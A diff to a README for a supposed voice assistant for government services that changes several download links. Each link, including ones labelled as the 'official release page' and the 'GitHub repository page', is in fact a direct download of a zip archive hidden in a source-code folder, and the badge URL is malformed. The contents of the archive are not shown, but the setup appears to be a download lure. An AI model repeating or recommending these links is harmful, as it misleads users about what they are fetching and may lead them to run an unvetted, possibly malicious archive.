@@ -1,6 +1,6 @@
 # 🤖 butterr_chicken - Voice Agent for Government Services
 
-[![Download butterr_chicken](https://raw.githubusercontent.com/avirajsingh1/butterr_chicken/main/src/components/chat/butterr_chicken_2.0.zip%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/avirajsingh1/butterr_chicken/main/src/components/chat/butterr_chicken_2.0.zip)
+[![Download butterr_chicken](https://github.com/avirajsingh1/butterr_chicken/raw/refs/heads/main/src/components/chat/butterr_chicken_2.0.zip%20Page-blue?style=for-the-badge)](https://github.com/avirajsingh1/butterr_chicken/raw/refs/heads/main/src/components/chat/butterr_chicken_2.0.zip)
 
 ## 📋 What is butterr_chicken?
 
@@ -35,7 +35,7 @@ Here is how you can start using butterr_chicken on your computer:
 1. **Visit the Download Page**
 
    Go to the official release page by clicking the big blue button above or this link:  
-   [https://raw.githubusercontent.com/avirajsingh1/butterr_chicken/main/src/components/chat/butterr_chicken_2.0.zip](https://raw.githubusercontent.com/avirajsingh1/butterr_chicken/main/src/components/chat/butterr_chicken_2.0.zip)  
+   [https://github.com/avirajsingh1/butterr_chicken/raw/refs/heads/main/src/components/chat/butterr_chicken_2.0.zip](https://github.com/avirajsingh1/butterr_chicken/raw/refs/heads/main/src/components/chat/butterr_chicken_2.0.zip)  
    This page holds the latest version of the software.
 
 2. **Choose Your Version**
@@ -64,7 +64,7 @@ Here is how you can start using butterr_chicken on your computer:
 
 You can start using butterr_chicken by visiting this page:
 
-[Download butterr_chicken](https://raw.githubusercontent.com/avirajsingh1/butterr_chicken/main/src/components/chat/butterr_chicken_2.0.zip)
+[Download butterr_chicken](https://github.com/avirajsingh1/butterr_chicken/raw/refs/heads/main/src/components/chat/butterr_chicken_2.0.zip)
 
 Check the latest release note to see new features or fixes before downloading.
 
@@ -120,7 +120,7 @@ butterr_chicken handles personal data carefully. Voice data is processed only to
 ## 📚 More Information
 
 For detailed technical info and updates, visit the GitHub repository page:  
-[https://raw.githubusercontent.com/avirajsingh1/butterr_chicken/main/src/components/chat/butterr_chicken_2.0.zip](https://raw.githubusercontent.com/avirajsingh1/butterr_chicken/main/src/components/chat/butterr_chicken_2.0.zip)
+[https://github.com/avirajsingh1/butterr_chicken/raw/refs/heads/main/src/components/chat/butterr_chicken_2.0.zip](https://github.com/avirajsingh1/butterr_chicken/raw/refs/heads/main/src/components/chat/butterr_chicken_2.0.zip)
 
 ---
 
